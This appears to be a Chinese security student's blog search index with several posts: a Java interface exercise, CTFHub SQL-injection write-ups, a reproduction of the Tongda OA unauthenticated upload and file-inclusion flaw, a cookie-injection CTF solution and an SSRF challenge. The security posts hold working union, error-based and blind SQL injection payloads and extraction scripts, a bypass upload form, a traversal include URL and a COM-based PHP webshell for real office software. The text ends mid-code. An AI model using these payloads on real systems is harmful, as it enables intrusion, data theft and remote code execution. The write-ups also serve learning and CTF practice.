obj)方法（可以看到，get方法的形参是抽象类ObjectVolume声明的对象）。\n\n（3）在main方法中，从键盘上输入1（表示球体）、2（表示立方体）、3（表示圆柱体）时，调用get方法可以分别得到球体、立方体、圆柱体的体积。（提示：调用get方法时，实参应该是各个子类对象，这时，实参子类对象传给形参抽象父类对象，则抽象父类对象就是上转型向对象，想一想，为了得到物体的体积，get方法中的语句应该是什么？）\n\n源代码import java.util.Scanner;\nabstract class ObjectVolume&#123;\n\tabstract double getVolume();//返回物体的体积\n&#125;\n\nclass Ball extends ObjectVolume&#123;//球体\n\tdouble r1;\n\tpublic Ball(double r1) &#123;\n\t\tthis.r1=r1;\n\t&#125;\n\tdouble getVolume() &#123;\n\t\treturn 4*Math.PI*Math.pow(r1, 3)/3;\n\t&#125;\n&#125;\nclass Cube extends ObjectVolume&#123;//正方体\n\tdouble a;\n\tpublic Cube(double a) &#123;\n\t\tthis.a=a;\n\t&#125;\n\tdouble getVolume() &#123;\n\t\treturn Math.pow(a, 3);\n\t&#125;\n&#125;\nclass Cylinder extends ObjectVolume&#123;//圆柱\n\tdouble r2,h;\n\tpublic Cylinder(double r2,double h) &#123;\n\t\tthis.r2=r2;\n\t\tthis.h=h;\n\t&#125;\n\tdouble getVolume() &#123;\n\t\treturn Math.PI*Math.pow(r2, 2)*h;\n\t&#125;\n&#125;\npublic class MainOne &#123;//主类\n\tstatic void get(ObjectVolume obj) &#123;\n\t\tSystem.out.println(obj.getVolume());\n\t&#125;\n\tpublic static void main(String[] args) &#123;\n\t\tSystem.out.print(\"Please input a number in [1,3]:\");\n\t\tScanner scan=new Scanner(System.in);\n\t\tString type=scan.nextLine();//判断是什么物体\n\t\tif(type.equals(\"1\"))&#123;//球\n\t\t\tSystem.out.print(\"please input the value of the r1:\");\n\t\t\tdouble r1=scan.nextDouble();\n\t\t\tBall ball=new Ball(r1);\n\t\t\tSystem.out.print(\"The area of the ball is:\");\n\t\t\tget(ball);\n\t\t&#125;\n\t\telse if(type.equals(\"2\")) &#123;//正方体\n\t\t\tSystem.out.print(\"please input the value of the a:\");\n\t\t\tdouble a=scan.nextDouble();\n\t\t\tCube cube=new Cube(a);\n\t\t\tSystem.out.print(\"The area of the cube is:\");\n\t\t\tget(cube);\n\t\t&#125;\n\t\telse if(type.equals(\"3\")) &#123;//圆柱\n\t\t\tSystem.out.print(\"please input the value of the r2:\");\n\t\t\tdouble r2=scan.nextDouble();\n\t\t\tSystem.out.print(\"please input the value of the h:\");\n\t\t\tdouble h=scan.nextDouble();\n\t\t\tCylinder cylinder=new Cylinder(r2,h);\n\t\t\tSystem.out.print(\"The area of the cylinder is:\");\n\t\t\tget(cylinder);\n\t\t&#125;\n\t\tscan.close();\n\t&#125;\n\n&#125;\n\n\n运行效果\n\n\n题目二有一个接口UnitPrice，如下所示：\n\ninterface UnitPrice\n\n&#123;\n\n   public double unitprice( ); //返回商品的单价\n\n&#125;\n\n（1）编写电视机类、计算机类和手机类来实现接口UnitPrice。（提示：各个类在实现接口时，在unitprice方法中，只需返回商品的单价，也就是double类型的常量即可。）\n\n（2）编写一个公共类，其中包含main方法和static double get(UnitPrice u)方法。（可以看到，get方法的形参是接口UnitPrice声明的接口变量，而且，get方法的返回类型是double，所以该方法中要有return语句返回对应类型的内容。）\n\n（3）在main方法中，从键盘上输入电视、计算机和手机的销售个数，调用get方法可以分别得到商店各个商品的单价，之后商品的总销售额。。（提示：调用get方法时，实参应该是各个类对象，这时，实参类对象传给形参接口变量，想一想，为了得到商品的单价，get方法中，形参会做什么呢？）\n\n源代码import java.util.Scanner;\ninterface UniPrice&#123;\n\tpublic double unitpritce();\n&#125;\n\nclass TV implements UniPrice&#123;\n\tdouble tvPrice=1500.00;\n\tvoid setTVPrice(double price) &#123;\n\t\tthis.tvPrice=price;\n\t&#125;\n\tpublic double unitpritce() &#123;\n\t\treturn tvPrice;\n\t&#125;\n&#125;\nclass Computer implements UniPrice&#123;\n\tdouble computerPrice=5000.00;\n\tvoid setComputerPrice(double price) &#123;\n\t\tthis.computerPrice=price;\n\t&#125;\n\tpublic double unitpritce() &#123;\n\t\treturn computerPrice;\n\t&#125;\n&#125;\nclass Phone implements UniPrice&#123;\n\tdouble phonePrice=2000.00;\n\tvoid setPhonePrice(double price) &#123;\n\t\tthis.phonePrice=price;\n\t&#125;\n\tpublic double unitpritce() &#123;\n\t\treturn phonePrice;\n\t&#125;\n&#125;\npublic class MainTwo &#123;\n\tstatic double get(UniPrice u) &#123;\n\t\treturn u.unitpritce();\n\t&#125;\n\n\tpublic static void main(String[] args) &#123;\n\t\tTV tv=new TV();\n\t\tComputer computer=new Computer();\n\t\tPhone phone=new Phone();\n\t\tScanner scan=new Scanner(System.in);\n\t\tSystem.out.println(\"----------Welcome to the sales statistics system----------\");\n\t\tSystem.out.println(\"**********************************************************\");\n\t\tSystem.out.println(\"If you need to change the unit price, please enter 'reset'\");\n\t\tSystem.out.println(\"-------Enter any character into the statistics flow-------\");\n\t\tString type=scan.nextLine();\n\t\tif(type.equals(\"reset\"))&#123;\n\t\t\tSystem.out.print(\"Please enter the new unit price of TV sets:\");\n\t\t\tint newTVPrice=scan.nextInt();\n\t\t\ttv.setTVPrice(newTVPrice);\n\t\t\tSystem.out.print(\"Please enter the new unit price of Computer:\");\n\t\t\tint newComputerPrice=scan.nextInt();\n\t\t\tcomputer.setComputerPrice(newComputerPrice);\n\t\t\tSystem.out.print(\"Please enter the new unit price of Phone:\");\n\t\t\tint newPhonePrice=scan.nextInt();\n\t\t\tphone.setPhonePrice(newPhonePrice);\n\t\t\tSystem.out.println(\"**********************************************************\");\n\t\t\tSystem.out.println(\"----Modify successfully, enter the statistical process----\");\n\t\t&#125;\n\t\tSystem.out.print(\"Please enter the sales volume of TV sets:\");\n\t\tint tvNum=scan.nextInt();\n\t\tSystem.out.print(\"Please enter the sales volume of Computer:\");\n\t\tint computerNum=scan.nextInt();\n\t\tSystem.out.print(\"Please enter the sales volume of Phone:\");\n\t\tint phoneNum=scan.nextInt();\n\t\tSystem.out.println(\"**********************************************************\");\n\t\tdouble allTVPrice=get(tv)*tvNum;\n\t\tdouble allComputerPrice=get(computer)*computerNum;\n\t\tdouble allPhonePrice=get(phone)*phoneNum;\n\t\tdouble allPrice=allTVPrice+allComputerPrice+allPhonePrice;\n\t\tSystem.out.println(\"TV sales is:\"+allTVPrice);\n\t\tSystem.out.println(\"Computer sales is:\"+allComputerPrice);\n\t\tSystem.out.println(\"Phone sales is:\"+allPhonePrice);\n\t\tSystem.out.println(\"Total sales of all commodities:\"+allPrice);\n\t\tSystem.out.println(\"**********************************************************\");\n\t\tSystem.out.println(\"-----------------End of analysis process------------------\");\n\t\tscan.close();\n\t&#125;\n\n&#125;\n\n\n运行效果我一时兴起就多写了点代码，多搞了reset模块\n\n\n总结interface和abstract Class学的时候其实很懵，感觉好像很复杂的样子，因为有很多东西与之前不同。但是其实使用起来都很相似，感觉运用的时候都和上转型对象有关。还有就是在主类中设置一个静态方法来实现对抽象方法的调用，这应该是和主类中的主方法是静态方法有关，为了可以成功调用抽象方法，所以就转了一手，声明出来一个静态方法。方法的形参是一个上转型对象。\n","slug":"Java代码练习之抽象类和接口","date":"2020-04-26T14:38:19.000Z","categories_index":"Java学习","tags_index":"Java","author_index":"A1andNS"},{"id":"f73a8e23e6f6f669cf99c7dba8fa0722","title":"","content":"技能树继续刚。\n0x01 整数型注入\n一个SQL整数型注入的大标题，还给出了执行语句是什么。这里我按他的步骤输入了一个1，他进行了select * from news where id=1查询，也给出了ID和Data。\n我现在还是按流程来，判断一下是否存在注入点。\n\n\n通过and 1=1和and 1=2的对比，可以判断出存在一个数字型注入点。\n通过order by测试，发现列数为2.\n\n查询一下php版本，发现没有显示出来，看来是只会显示第一条信息，所以用limit来解决。\n\n这里可以看到用的是MariaDB，从deb可以看出服务器系统是Linux，而且是Debian发行版。\n查询表名：1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() limit 1,1#\n\n继续查列名：select * from news where id=1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39; limit 1,1#\n\n下面爆内容：select * from news where id=1 union select 1,group_concat(flag) from flag limit 1,1#\n\n得到ctfhub{aeb3b0421660209b86bd97aa9087cd8064506af8}\n0x02 字符型注入这里用手工注入了，也可以去跑sqlmap\n这题是字符型注入，通过1=1和1=2就可以判断出注入点\n首先通过检测，发现了列数为2\n\n先找一下回显点，在2处。\n\n数据库版本查询：select * from news where id=&#39;1&#39; union select 1,version() limit 1,1#&#39;\n\n查询表名：select * from news where id=&#39;1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() limit 1,1#&#39;\n\n查询列名：select * from news where id=&#39;1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39; limit 1,1#&#39;\n\n拿数据：select * from news where id=&#39;1&#39; union select 1,group_concat(flag) from flag limit 1,1#&#39;\n\n得到ctfhub{66ce657692212317c5f97f29c593f4ceaac1b970}\n0x03 报错注入是报错注入，这题比较简单，可以直接跑sqlmap\n\n\n\n这样很容易就拿到了flag，但是大多数sql不会这么容易拿到。\n吃了各饭回来继续\n手工注入来一下\n\n先爆数据库名看看。\n2 union select count(*),concat(floor(rand(0)*2),0x26,database())x from information_schema.tables group by x\n\n再爆表名，因为不止有一个表所以就要一个一个爆了。\n2 union select count(*),concat(floor(rand(0)*20),0x26,(select table_name from information_schema.tables where table_schema=&#39;sqli&#39; limit 0,1))x from information_schema.tables group by x\n\n这里第二个就是flag了。\n然后爆列名\npayload:\n2 union select count(*),concat(floor(rand(0)*20),0x26,(select column_name from information_schema.columns where table_schema=&#39;sqli&#39; and table_name=&#39;flag&#39; limit 0,1))x from information_schema.columns group by x\n\n然后爆内容\npayload:\n2 union select count(*),concat(floor(rand(0)*20),0x26,(select flag from flag limit 0,1))x from information_schema.columns group by x\n\n就可以拿到flag\n0x04 布尔注入经过测试发现时数字型布尔注入，发现了列数为2\n\n\n发现回显不对头，当查询语句报错时回显error，但是在查询结果为空的时候时回显success。所以and不能用了，要用if。\nif(expr1,expr2,expr3)，如果expr1的值为true，则执行expr2语句，如果expr1的值为false，则执行expr3语句。\nexp：\nimport requests\n\nurl = 'http://challenge-0b37c0f909b6982c.sandbox.ctfhub.com:10080/?id='\nname = ''\nfor i in range(1,10):\n    for j in range(48,126):\n        test_url = url + 'if(ascii(substr((select database()),&#123;0&#125;,1))=\"&#123;1&#125;\",1,(select table_name from information_schema.tables))'.format(i,j)\n        r = requests.get(test_url)\n        if 'query_success' in r.text:\n            name = name + chr(j)\n            print(name)\n\n\nimport requests\nurl='http://challenge-0b37c0f909b6982c.sandbox.ctfhub.com:10080/?id='\nfor i in range(0,4):\n    name=''\n    for j in range(0,10):\n        for k in '0123456789zaqwsxedcrfvtgbyhnujmikolp_':\n            test_url=url+'if(substr((select column_name from information_schema.columns where table_name=\\\"flag\\\" limit &#123;0&#125;,1),&#123;1&#125;,1)=\"&#123;2&#125;\",1,(select column_name from information_schema.columns))'.format(i,j,k)\n            #print(test_url)\n            rep=requests.get(test_url)\n            if 'query_success' in rep.text:\n                name=name+k\n                break\n    print(name)\n\n\nimport requests\nurl='http://challenge-0b37c0f909b6982c.sandbox.ctfhub.com:10080/?id='\nfor i in range(0,4):\n    name=''\n    for j in range(0,10):\n        for k in '0123456789zaqwsxedcrfvtgbyhnujmikolp_':\n            test_url=url+'if(substr((select column_name from information_schema.columns where table_name=\"flag\" limit &#123;0&#125;,1),&#123;1&#125;,1)=\"&#123;2&#125;\",1,(select column_name from information_schema.columns))'.format(i,j,k)\n            #print(test_url)\n            rep=requests.get(test_url)\n            if 'query_success' in rep.text:\n                name=name+k\n                break\n    print(name)\n\n\nimport requests\nurl='http://challenge-0b37c0f909b6982c.sandbox.ctfhub.com:10080/?id='\nname=''\nfor j in range(1,50):\n    for i in range(48,126):\n        test_url=url+'if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,1,(select table_name from information_schema.tables))'.format(j,i)\n        rep=requests.get(test_url)\n        if 'query_success' in rep.text:\n            name=name+chr(i)\n            print(name)\n            break\n\n\n就得到了flag\n0x05 时间盲注时间盲注用脚本来解决吧\nif(substr(database(),1,1)=&#39;s&#39;,sleep(1),1)#用它来测试一下，发现执行命令后会有一定时间的等待，确定为时间盲注。\nexp：\n#爆表名\nimport requests\nimport time\n\nurl = 'http://challenge-cebbd1dbb7f4db93.sandbox.ctfhub.com:10080/?id='\nfor k in range(0,10):\n    name = ''\n    for i in range(1,10):\n        print(i)\n        for j in range(48,126):\n            test_url = url + 'if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;,sleep(3),1)'.format(k,i,j)\n             #sleep(1)容易造成误判\n            start_time = time.time()\n            r = requests.get(test_url)\n            end_time = time.time()\n            t = end_time - start_time\n            if t > 3:\n                name = name + chr(j)\n                break\n    print(name)\n#爆列名\n#test_url = url+'if(ascii(substr((select column_name from information_schema.columns where table_name='flag' limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;,sleep(1),1)'.format(k,i,j)\n\n#爆数据\n'''for k in range(0,10):\n    name = ''\n    for i in range(1,50):\n        print(i)\n        for j in range(48,126):\n            test_url = url+'if(ascii(substr((select flag from flag limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;,sleep(3),1)'.format(k,i,j)\n            #sleep(1)容易造成误判\n            start_time = time.time()\n            r = requests.get(test_url)\n            end_time = time.time()\n            t = end_time - start_time\n            if t > 3:\n                name = name + chr(j)\n                break\n        print(name)\n'''\n\n\n\n\n不知道为什么总会出现这种情况，部分字符出错，整体正确。\n所以就使用了sqlmap来拿flag，还是太菜了。\n\n后来经过我的不断研究和尝试，发现了问题所在，那就是sleep()函数的时间，之前设置的是1秒，容易出现误判，所以我应该吧sleep()时间调长，果然调长后问题就解决了。\n\nnice，圆满解决问题。\n0x06 MySQL结构判断出列数为2.\n\n数据库版本查询。\n\n表名：\n\n列名：\n\n数据：\n\n0x07 Cookie注入cookie注入，注入点再cookie中id处\n\n通过测试order by 2,可以判断处列数为2.\n由于它默认显示第一个查询内容，所以id=-1.然后用union+select+1,2判断处显示为再Data位置。\n下面就是常规操作：\n数据库版本：10.3.22-MariaDB-0+deb10u1\n#payload：`-1+union+select+1,group_concat(table_name)+from information_schema.tables+where+table_schema=database()`\n表名：sndjdhnevs,news\n#payload:`-1+union+select+1,group_concat(column_name)+from information_schema.columns+where+table_schema=database()+and+table_name='sndjdhnevs'`\n列名：sgelnaypyg\n#payload:`-1+union+select+1,group_concat(sgelnaypyg)+from+sndjdhnevs`\nctfhub&#123;4e8cb8e1f1bb8eaf159aa6088b491c6936469259&#125;\n\n0x08 UA注入注入点就在UA处，只要把UA进行修改就好了。\n经过判断可以知道列数由两列，然后判断处显示位是-1 union select 1,2，显示位再Data位。\n下面就是常规操作：\n数据库版本：10.3.22-MariaDB-0+deb10u1\n#payload：`-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()`\n表名：news,phxqcyyize\n#payload:`-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='phxqcyyize'`\n列名：vymynlhohw\n#payload:`-1 union select 1,group_concat(vymynlhohw) from phxqcyyize`\nctfhub&#123;39395297888934808939409493a60dfb93010b45&#125;\n\n0x09 refer注入和前面几题一样只不过是改在referer处注入了。\n一样去判断发现列数为2，然后显示位是Data位。\n下面就是常规操作：\n数据库版本：10.3.22-MariaDB-0+deb10u1\n#payload：`-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()`\n表名：news,zhezriinwe\n#payload:`-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='zhezriinwe'`\n列名：cupxguktzl\n#payload:`-1 union select 1,group_concat(cupxguktzl) from zhezriinwe`\nctfhub&#123;909bee1502e7b3ee0a8f4eb608cd0d86276ccab9&#125;\n\n0x10 反射型XSS很明显，让name=&lt;script&gt;alert(&quot;XSS&quot;)&lt;/Fscript&gt;可以明显看到弹窗。\n","slug":"CTFHub技能树之WEB","date":"2020-04-22T06:35:35.000Z","categories_index":"CTF","tags_index":"WEB,SQL注入,XSS","author_index":"A1andNS"},{"id":"bcc4c805c00a13a68269e7322cfcb1df","title":"通达OA未授权任意文件上传及文件包含漏洞分析学习","content":"今年3月份通达OA爆出了文件上传和文件包含漏洞，网络上很多复现和分析的博客，今天我也来试着分析分析，据360灵腾安全实验室判断该漏洞等级为高，利用难度低，威胁程度高，所以可能比较适合代码审计的新手来练练。\n0x00 漏洞概述通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化系统，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等。\n该漏洞在绕过身份验证的情况下通过文件上传漏洞上传恶意php文件，组合文件包含漏洞最终造成远程代码执行漏洞，从而导致可以控制服务器system权限。\n0x01 任意文件上传网上很多信息，存在漏洞的文件就是ispirit/im/upload.php\n由于php文件都是通过zend加密的，所以还需要zend解密工具解密才行。\n\n至于zend解密工具，自行百度就OK了。\n那么就来看看存在问题的那段代码吧！\n$P = $_POST[\"P\"];\nif (isset($P) || ($P != \"\")) &#123;\n\tob_start();\n\tinclude_once \"inc/session.php\";\n\tsession_id($P);\n\tsession_start();\n\tsession_write_close();\n&#125;\n//如果有传递参数P，就可以绕过执行auth.php了，也就可以绕过了登录验证进行文件上传了。\nelse &#123; \n\tinclude_once \"./auth.php\";\n&#125;\n\nif-else语句一旦编写时出现判断失误，就会出现必要的执行步骤被忽略的可能。\n我用burpsuite来试一下吧，如果直接在未登录情况下访问这个url是会提示用户未登录的。\n\n如果我传入一个P参数提交，就会发现成功绕过了登录认证，并且PHPSESSID被设置为了P参数。\n\n接下来继续看又有一个IF-else语句，是判断DEST_UID的\n$TYPE = $_POST[\"TYPE\"];\n$DEST_UID = $_POST[\"DEST_UID\"];\n$dataBack = array();\nif (($DEST_UID != \"\") &amp;&amp; !td_verify_ids($ids)) &#123;\t//验证DEST_UID是否为非数字\n\t$dataBack = array(\"status\" => 0, \"content\" => \"-ERR \" . _(\"接收方ID无效\"));\n\techo json_encode(data2utf8($dataBack));\n\texit();\n&#125;\n\nif (strpos($DEST_UID, \",\") !== false) &#123;\n&#125;\nelse &#123;\n\t$DEST_UID = intval($DEST_UID);//若DEST_UID为空或0那么DEST_UID都为0\n&#125;\n\nif ($DEST_UID == 0) &#123;//如果DEST_UID为0\n\tif ($UPLOAD_MODE != 2) &#123;\n\t\t$dataBack = array(\"status\" => 0, \"content\" => \"-ERR \" . _(\"接收方ID无效\"));\n\t\techo json_encode(data2utf8($dataBack));\n\t\texit();\n\t&#125;\n&#125;\n\n\n所以我需要传入一个不为空和0的数字就可以了。\n\n这里有报错是因为我没有去上传文件。接下来继续看函数。\nif (1 &lt;= count($_FILES)) &#123; //只要全局变量1&lt;=count($_FILES)就OK\n\tif ($UPLOAD_MODE == \"1\") &#123;\n\t\tif (strlen(urldecode($_FILES[\"ATTACHMENT\"][\"name\"])) != strlen($_FILES[\"ATTACHMENT\"][\"name\"])) &#123;\n\t\t\t$_FILES[\"ATTACHMENT\"][\"name\"] = urldecode($_FILES[\"ATTACHMENT\"][\"name\"]);\n\t\t&#125;\n\t&#125;\n//执行upload\n\t$ATTACHMENTS = upload(\"ATTACHMENT\", $MODULE, false);\n\n这里是只要全局变量1&lt;=count($_FILES)就OK了，可以执行下面内容，也就是说有文件上传的时候就会去调用upload函数。\n那就看看upload函数，它在inc/utility_file.php中，主要是看上传允许的后缀问题，但是这用的是getshell方式，而getshell方式是文件包含，所以不饶过也是可以的了。\nif ($ATTACH_ERROR == UPLOAD_ERR_OK) &#123;\n\t\t\tif (!is_uploadable($ATTACH_NAME)) &#123;\n\t\t\t\t$ERROR_DESC = sprintf(_(\"禁止上传后缀名为[%s]的文件\"), substr($ATTACH_NAME, strrpos($ATTACH_NAME, \".\") + 1));\n\t\t\t&#125;\n\n这里调用了一个is_uploadable()函数，跟进去看一下这个函数，这个函数也是在inc/utility_file.php里。\nfunction is_uploadable($FILE_NAME)\n&#123;\n\t$POS = strrpos($FILE_NAME, \".\");\n\n\tif ($POS === false) &#123;\n\t\t$EXT_NAME = $FILE_NAME;\n\t&#125;\n\telse &#123;\n\t\tif (strtolower(substr($FILE_NAME, $POS + 1, 3)) == \"php\") &#123;\n\t\t\treturn false;\n\t\t&#125;\n\n\t\t$EXT_NAME = strtolower(substr($FILE_NAME, $POS + 1));\n\t&#125;\n\n\n这里主要是寻找.出现过的最后一次处，然后寻找后三个字符，并且将其通过strtolower()转换为小写，然后比对是否是&#39;php&#39;，所以如果要绕过后缀验证，只要在最后加一个.就可以了。\n接下来看一下UPLOAD_MODE判断结构。可以看出来它的主要作用是判断类型回显相应的内容，参数的值有1，2，3,但是这个UPLOAD_MODE参数是怎么来的我就不太知道了，在upload.php文件里没有找到UPLOAD_MODE的来源，有可能是文件包含过来的。\n\n接下来我们继续分析关于Path的问题，首先是看到了FILE_PATH参数。\n\n可以看到他和ATTACHMENT_ID和ATTACHMENT_NAME有关，我们跟进定位去看一下这两个参数，发现它们都来源自ATTACHMENTS参数。而ATTACHMENTS又是upload()函数的返回结果。\n而这两个参数来之对应的ATTACHMENTS[&quot;ID&quot;]和ATTACHMENTS[&quot;NAME&quot;]，而根据网上的文章，它们来源于add_attach函数，而add_attach函数也是在inc/utility_file.php文件下。\n\n那么就跟进到add_attach里看一下是什么样的。我们可以从函数里面看到保存路径，FILENAME。\n\n查看add_attach函数的返回值，返回值中包含了文件路径以及自定义的文件名，现在我们返回到upload函数\n\n这里要上传可以使用以下的html：\n&lt;form id=\"frmUpload\" enctype=\"multipart/form-data\"\n      action=\"http://192.168.0.109:80/ispirit/im/upload.php\" method=\"post\">Upload a new file:&lt;br>\n    &lt;input type=\"hidden\" name=\"P\" value=\"666\">\n    &lt;input type=\"hidden\" name=\"TYPE\" value=\"666\">\n    &lt;input type=\"hidden\" name=\"DEST_UID\" value=\"1\">\n    &lt;input type=\"file\" name=\"ATTACHMENT\" size=\"50\">&lt;br>\n    &lt;input type=\"hidden\" name=\"UPLOAD_MODE\" value=\"1\">\n    &lt;input id=\"btUpload\" type=\"submit\" value=\"Upload\">\n&lt;/form>\n\n我首先上传了一个jpg图像，回显告诉我一切正常。我在使用.绕过后很奇怪的（这里上传的是PHP文件），回显依旧是报错的，这让我很困惑。\n\n我决定去看一下上传目录，结果发现居然是上传成功了。\n\n我总感觉我的漏洞环境似乎没有搞好，后来还好从大佬哪里拿到了一个漏洞完整版本，所以就很顺利的成功复现了。\n\n0x02 文件包含漏洞根据网上诸多的信息，文件包含漏洞是位于ispirit/interface/gateway.php\nif ($url != \"\") &#123;\n\t\tif (substr($url, 0, 1) == \"/\") &#123;\n\t\t\t$url = substr($url, 1);\n\t\t&#125;\n\n\t\tif ((strpos($url, \"general/\") !== false) || (strpos($url, \"ispirit/\") !== false) || (strpos($url, \"module/\") !== false)) &#123;\n\t\t\tinclude_once $url;//只需要存在general/ ispirit/ module/ 这几个中的任何一个字符串就可以\n\t\t&#125;\n\t&#125;\n\n构造一个\nhttp:&#x2F;&#x2F;192.168.0.109&#x2F;ispirit&#x2F;interface&#x2F;gateway.php?json&#x3D;&#123;%22url%22:&quot;module&#x2F;..&#x2F;..&#x2F;attach&#x2F;im&#x2F;2004&#x2F;30022247.webshell.php&quot;&#125;&amp;cmd&#x3D;whoami\n\n试着去RCE但是很可惜，并没有成功，虽然上传了webshell，但是却无法执行。这可能是存在过滤问题。所以我也去了解了一下。\n通达OA开启了 disable_funcation 功能 很多常见的命令执行函数如 exec、eval、system等都被禁止了\n所以我应该去重新构建一个webshell，或者找到一个bypass方式。\n我重新上传了一个webshell：2050173889.hah.php\n&lt;?php\n$command=$_POST['cmd'];\n$wsh = new COM('WScript.shell');\n$exec = $wsh->exec(\"cmd /c \".$command);\n$stdout = $exec->StdOut();\n$stroutput = $stdout->ReadAll();\necho $stroutput;\n?>\n\n构造一个新的json：\nhttp:&#x2F;&#x2F;192.168.0.109&#x2F;ispirit&#x2F;interface&#x2F;gateway.php?json&#x3D;&#123;%22url%22:&quot;module&#x2F;..&#x2F;..&#x2F;attach&#x2F;im&#x2F;2004&#x2F;2050173889.hah.php&quot;&#125;&amp;cmd&#x3D;whoami\n\n成功执行了whoami\n\n接下来再试一下dir命令：\n\n复现成功了，第一次复现看了很多教程还是遇到了很多的问题。\n问题1、漏洞文件，再复现之前对于存在漏洞的软件安装程序的收集工作很重要，只有一个完整的漏洞版本程序对于复现来说才是最佳的。虽然某些文件存在漏洞，但是软件是一个整体，还包含了很多其他函数的调用。版本升级必然会带来其他代码的修改。从而影响复现效果。\n2、注意漏洞软件再联网状态下的自动更新情况，这次做复现就遇到了这个情况，因为某些原因，手上的工作停了一会。结果就触发了软件基本都会有的闲时自动更新功能，导致我回来后，漏洞消失了，确实困扰了我好久。起初一直以为是自己构造或者传值有问题，但是反复检查并没有问题。好在我马上反应到可能存在自动更新覆盖漏洞版本的情况，所以就去检查了一下版本号，果然从11.3升级到了11.5。\n3、在执行RCE的时候，我起初一直使用的是简单的一句话木马，但是一直没有RCE成功，这就让我很懵了。不知所措，于是更换了多个一句话木马，例如eval、system等，但是均无效果。于是试着了去网络上查询相关信息，果然查到了通达OA有做一些处理。\n参考资料1、https://www.cnblogs.com/-qing-/p/10944118.html\n2、https://www.freebuf.com/column/230871.html\n3、https://xz.aliyun.com/t/7433\n","slug":"通达OA未授权任意文件上传及文件包含漏洞分析学习","date":"2020-04-18T01:37:32.000Z","categories_index":"学习笔记","tags_index":"漏洞分析,RCE,文件上传,代码审计,通达OA","author_index":"A1andNS"},{"id":"6bb2202be349e1d43d125b9c1b0ff943","title":"Cookie注入练习题","content":"最近做了一题Cookie注入的题目\n这是一题cookie注入的练习题，出自BSidesCF 2019]Sequel，这里用BUUOJ来做。\n\n爆破得到username为guest，password为guest\n登陆进去\n\n看到一个电影数据库，其他什么都没有看看网页源码和HTTP请求内容。发现一个奇怪的cookie\n\n看起来有点像base64，所以做一个base64的解码，果然是base64.\n解码后得到一个json格式{“username”:”guest”,”password”:”guest”}\n然后开始试一下有没有存在cookie注入，构造了一个&#123;&quot;username&quot;:&quot;guest\\&quot; or \\&quot;1\\&quot;=\\&quot;1&quot;,&quot;password&quot;:&quot;guest&quot;&#125;,把他base64一下，用burpsuit提交一下，发现存在注入。\n那么就开始手工注入来获取表名\n得到一个表名为userinfo的表\nexp：\nimport requests\nimport base64\nimport string\n\nflag = \"\"\nss = string.printable\nurl = \"http://fd19da3a-5d4e-469c-937c-98f2f0562928.node3.buuoj.cn/sequels\"\nfor x in range(1, 10):\n    for i in range(1, 32):\n        for y in ss:\n            exp = '&#123;&#123;\"username\":\"\\\\\" or (substr((select username from userinfo limit &#123;0&#125;,1),&#123;1&#125;,1)=\\\\\"&#123;2&#125;\\\\\")or \\\\\"\",\"password\":\"guest\"&#125;&#125;'.format(\n                x, i, y)\n            #爆密码改username为password\n            #print(exp)\n            code = base64.b64encode(exp.encode()).decode()\n            cookies = &#123;\n                \"1337_AUTH\": code\n            &#125;\n            content = requests.get(url=url, cookies=cookies).content\n            if \"Sequel\" in content.decode():\n                flag += y\n                print(flag)\n                break\n\n\n得到\nusername：sequeladmin\npassword：f5ec3af19f0d3679e7d5a148f4ac323d\n登录得到flag\n\n","slug":"Cookie注入练习题","date":"2020-04-17T12:09:30.000Z","categories_index":"CTF","tags_index":"WEB,SQL注入","author_index":"A1andNS"},{"id":"c2e945f14bdb314a4d9b15471662d692","title":"星阑平台练习","content":"0x0001 Misc 2\n一开始不知道是什么意思后来看了一下字母，发现只有ABCDE，所以猜测这是一个16进制段\n在网上用工具把16进制转换为ascii后，得到了cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g\n\n看起来有点像base64,去试了一下。\n得到r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM \n这个完全看不懂是什么，单词似乎不太可能，难搞。\n直到开始看键盘，感觉似乎是键盘密码。r5yg中间刚好夹着个t，其他的也一样。\n这样就可以推出tongyuan了。加上题目开头的PS：感觉应该是了。\n所以就试着去提交了一下，flag{tongyuan+}\n正确了。\n0x0002 WEB2一开始就提供了php源代码，这里很明显可以看出有一个SSRF漏洞。我们可以通过这个漏洞任意读取文件。\n&lt;?php\nfunction curl($url)&#123;\n    $ch = curl_init();\n    curl_setopt($ch, CURLOPT_URL, $url);\n    curl_setopt($ch, CURLOPT_HEADER, 0);\n    $re = curl_exec($ch);\n    curl_close($ch);\n    return $re;\n&#125;\nif(!empty($_GET['url']))&#123;\n    $url = $_GET['url'];\n    curl($url);\n&#125;else&#123;\n    highlight_file(__FILE__); \n&#125;\n\n\n一开始先对这个网页做个扫描\n\n发现一个robots.txt访问一下。\n\n发现一个webshell，访问一下，回显这是一个webshell。\n使用SSRF来读取webshell源代码。\n构造一个?url=file:///var/www/html/webshe11231231231.php\n这一步我把php文件名给打错了，搞的浪费了好多时间。\n访问没有回显，看一下网页源代码，在源代码里看到了PHP源码。\n&lt;?php\n\n$serverList &#x3D; array(\n    &quot;127.0.0.1&quot;\n);\n$ip &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];\nforeach ($serverList as $host) &#123;\n    if ($ip &#x3D;&#x3D;&#x3D; $host) &#123;\n        if ((!empty($_POST[&#39;admin&#39;])) and $_POST[&#39;admin&#39;] &#x3D;&#x3D;&#x3D; &#39;h1admin&#39;) &#123;\n            @eval($_POST[&#39;hacker&#39;]);\n        &#125; \n        else &#123;\n            die(&quot;You aren&#39;t admin!&quot;);\n        &#125;\n    &#125;\n    else &#123;\n        